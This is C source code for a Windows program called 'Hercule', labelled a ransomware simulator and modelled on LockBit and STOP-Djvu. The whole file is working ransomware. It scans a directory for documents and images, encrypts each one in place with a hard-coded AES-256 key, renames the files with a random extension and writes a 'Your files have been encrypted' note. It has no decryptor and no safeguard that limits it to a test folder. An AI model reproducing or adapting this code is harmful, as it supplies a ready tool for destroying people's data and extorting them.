// Hercule v2.0
// Ransomware simulator v2.0 — AES-256-CBC via BCrypt
// Identical to LockBit/STOP-Djvu in terms of I/O behavior

#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#pragma comment(lib, "bcrypt.lib")

#define CHUNK_SIZE      (64 * 1024)
#define RANDOM_EXT_LEN  8

static const BYTE AES_KEY[32] = {
    0x4B, 0x72, 0x61, 0x74, 0x6F, 0x73, 0x41, 0x6E,
    0x74, 0x69, 0x52, 0x61, 0x6E, 0x73, 0x6F, 0x6D,
    0x44, 0x65, 0x66, 0x65, 0x6E, 0x73, 0x65, 0x54,
    0x65, 0x73, 0x74, 0x4B, 0x65, 0x79, 0x32, 0x36
};

static const BYTE AES_IV[16] = {
    0x48, 0x65, 0x72, 0x63, 0x75, 0x6C, 0x65, 0x49,
    0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
};

static const char* g_TargetExtensions[] = {
    ".txt", ".doc",  ".docx", ".pdf",
    ".jpg", ".jpeg", ".png",  ".bmp",
    ".xls", ".xlsx", ".ppt",  ".pptx",
    NULL
};

#pragma pack(push, 1)
typedef struct _HERCULE3_HEADER {
    DWORD Magic;
    DWORD Version;
    DWORD OriginalSize;
    DWORD PaddedSize;
    BYTE  IV[16];
    BYTE  Reserved[8];
} HERCULE3_HEADER;
#pragma pack(pop)

typedef struct _AES_CTX {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    PUCHAR            keyObject;
    ULONG             keyObjectSize;
} AES_CTX;


void GenerateRandomExtension(char* ext, size_t extSize)
{
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyz0123456789";

    srand((unsigned int)time(NULL));

    ext[0] = '.';
    for (int i = 1; i <= RANDOM_EXT_LEN; i++)
        ext[i] = charset[rand() % (sizeof(charset) - 1)];
    ext[RANDOM_EXT_LEN + 1] = '\0';
}


BOOL AES_Init(AES_CTX* ctx)
{
    NTSTATUS status;
    ULONG    cbResult = 0;

    RtlZeroMemory(ctx, sizeof(AES_CTX));

    status = BCryptOpenAlgorithmProvider(
        &ctx->hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    status = BCryptSetProperty(
        ctx->hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto Fail;

    status = BCryptGetProperty(
        ctx->hAlg, BCRYPT_OBJECT_LENGTH,
        (PUCHAR)&ctx->keyObjectSize, sizeof(ULONG),
        &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto Fail;

    ctx->keyObject = (PUCHAR)HeapAlloc(
        GetProcessHeap(), 0, ctx->keyObjectSize);
    if (!ctx->keyObject) goto Fail;

    status = BCryptGenerateSymmetricKey(
        ctx->hAlg, &ctx->hKey,
        ctx->keyObject, ctx->keyObjectSize,
        (PUCHAR)AES_KEY, sizeof(AES_KEY), 0);
    if (!BCRYPT_SUCCESS(status)) goto Fail;

    return TRUE;

Fail:
    if (ctx->hAlg)      BCryptCloseAlgorithmProvider(ctx->hAlg, 0);
    if (ctx->keyObject) HeapFree(GetProcessHeap(), 0, ctx->keyObject);
    return FALSE;
}

VOID AES_Cleanup(AES_CTX* ctx)
{
    if (ctx->hKey)      BCryptDestroyKey(ctx->hKey);
    if (ctx->hAlg)      BCryptCloseAlgorithmProvider(ctx->hAlg, 0);
    if (ctx->keyObject) HeapFree(GetProcessHeap(), 0, ctx->keyObject);
}

BOOL AES_Encrypt(
    AES_CTX* ctx,
    PUCHAR   plaintext,
    ULONG    plaintextSize,
    PUCHAR   ciphertext,
    ULONG    ciphertextSize,
    ULONG* bytesEncrypted)
{
    BYTE ivCopy[16];
    memcpy(ivCopy, AES_IV, 16);

    NTSTATUS status = BCryptEncrypt(
        ctx->hKey,
        plaintext, plaintextSize,
        NULL,
        ivCopy, sizeof(ivCopy),
        ciphertext, ciphertextSize,
        bytesEncrypted,
        BCRYPT_BLOCK_PADDING);

    return BCRYPT_SUCCESS(status);
}

//File encryption

BOOL EncryptFile_AES(const char* filePath,
    AES_CTX* ctx,
    const char* sessionExt)
{
    printf("[Hercule] Processing: %s\n", filePath);

    HANDLE hFile = CreateFileA(filePath,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[Hercule] Open failed: 0x%X\n", GetLastError());
        return FALSE;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD  originalSize = (DWORD)fileSize.QuadPart;
    PUCHAR plaintext = (PUCHAR)malloc(originalSize);
    if (!plaintext) { CloseHandle(hFile); return FALSE; }

    DWORD bytesRead = 0;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, plaintext, originalSize, &bytesRead, NULL)
        || bytesRead != originalSize)
    {
        free(plaintext);
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD  paddedSize = ((originalSize / 16) + 1) * 16;
    PUCHAR ciphertext = (PUCHAR)malloc(paddedSize);
    if (!ciphertext) {
        free(plaintext);
        CloseHandle(hFile);
        return FALSE;
    }

    ULONG encryptedSize = 0;
    if (!AES_Encrypt(ctx, plaintext, originalSize,
        ciphertext, paddedSize, &encryptedSize))
    {
        printf("[Hercule] AES encrypt failed\n");
        free(plaintext);
        free(ciphertext);
        CloseHandle(hFile);
        return FALSE;
    }
    free(plaintext);

    HERCULE3_HEADER header = { 0 };
    header.Magic = 0x48455233;
    header.Version = 3;
    header.OriginalSize = originalSize;
    header.PaddedSize = encryptedSize;
    memcpy(header.IV, AES_IV, 16);

    DWORD  totalSize = sizeof(HERCULE3_HEADER) + encryptedSize;
    PUCHAR finalData = (PUCHAR)malloc(totalSize);
    if (!finalData) {
        free(ciphertext);
        CloseHandle(hFile);
        return FALSE;
    }

    memcpy(finalData, &header, sizeof(HERCULE3_HEADER));
    memcpy(finalData + sizeof(HERCULE3_HEADER), ciphertext, encryptedSize);
    free(ciphertext);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);

    DWORD offset = 0, bytesWritten = 0;
    while (offset < totalSize) {
        DWORD toWrite = min(CHUNK_SIZE, totalSize - offset);
        if (!WriteFile(hFile, finalData + offset,
            toWrite, &bytesWritten, NULL))
        {
            free(finalData);
            CloseHandle(hFile);
            return FALSE;
        }
        offset += bytesWritten;
    }
    free(finalData);
    CloseHandle(hFile);

    // Rename with session extension
    char renamedPath[MAX_PATH];
    snprintf(renamedPath, sizeof(renamedPath),
        "%s%s", filePath, sessionExt);

    MoveFileA(filePath, renamedPath);
    printf("[Hercule] -> %s\n", renamedPath);
    return TRUE;
}

// Check the extension

BOOL IsTargetExtension(const char* filename, const char* sessionExt)
{
    const char* ext = strrchr(filename, '.');
    if (!ext) return FALSE;


    if (_stricmp(ext, sessionExt) == 0) return FALSE;

    for (int i = 0; g_TargetExtensions[i]; i++)
        if (_stricmp(ext, g_TargetExtensions[i]) == 0)
            return TRUE;
    return FALSE;
}

// Scan the directory


int ScanDirectory(const char* dir,
    char        files[][MAX_PATH],
    int         maxFiles,
    const char* sessionExt)
{
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return 0;

    int count = 0;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;

        if (!IsTargetExtension(fd.cFileName, sessionExt)) continue;

        snprintf(files[count++], MAX_PATH, "%s\\%s", dir, fd.cFileName);
        if (count >= maxFiles) break;

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    return count;
}


int main(int argc, char* argv[])
{
    const char* targetDir = (argc > 1)
        ? argv[1]
        : "C:\\Users\\ultim\\Desktop\\Test";

    char sessionExt[RANDOM_EXT_LEN + 2] = { 0 };
    GenerateRandomExtension(sessionExt, sizeof(sessionExt));

    printf("========================================\n");
    printf("[Hercule] Ransomware Simulator v3\n");
    printf("[Hercule] Mode   : AES-256-CBC\n");
    printf("[Hercule] Ext    : %s\n", sessionExt);
    printf("[Hercule] Target : %s\n", targetDir);
    printf("========================================\n\n");

    AES_CTX ctx;
    if (!AES_Init(&ctx)) {
        printf("[Hercule] AES init failed\n");
        return 1;
    }

    static char files[256][MAX_PATH];

    int count = ScanDirectory(targetDir, files, 256, sessionExt);
    printf("[Hercule] Found %d files\n\n", count);

    int ok = 0, fail = 0;
    for (int i = 0; i < count; i++) {
        if (EncryptFile_AES(files[i], &ctx, sessionExt)) ok++;
        else fail++;
        Sleep(50);
    }

    char notePath[MAX_PATH];
    snprintf(notePath, sizeof(notePath),
        "%s\\README_DECRYPT.txt", targetDir);

    HANDLE hNote = CreateFileA(notePath, GENERIC_WRITE,
        0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hNote != INVALID_HANDLE_VALUE) {
        char note[256];
        snprintf(note, sizeof(note),
            "### HERCULE v3 — AES-256-CBC ###\n"
            "Extension: %s\n"
            "Your files have been encrypted.\n",
            sessionExt);
        DWORD w;
        WriteFile(hNote, note, (DWORD)strlen(note), &w, NULL);
        CloseHandle(hNote);
    }

    AES_Cleanup(&ctx);

    printf("\n========================================\n");
    printf("[Hercule] Done     : %d OK / %d failed\n", ok, fail);
    printf("[Hercule] Extension: %s\n", sessionExt);
    printf("========================================\n");

    return 0;
}